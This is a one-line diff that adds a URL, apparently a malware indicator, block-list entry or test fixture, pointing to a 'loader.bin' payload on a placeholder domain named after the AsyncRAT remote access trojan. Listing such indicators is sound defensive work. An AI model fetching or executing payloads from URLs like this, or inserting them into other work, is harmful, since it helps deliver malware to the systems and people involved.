@@ -1,0 +1,1 @@
+http://asyncrat-3.example.test/loader.bin
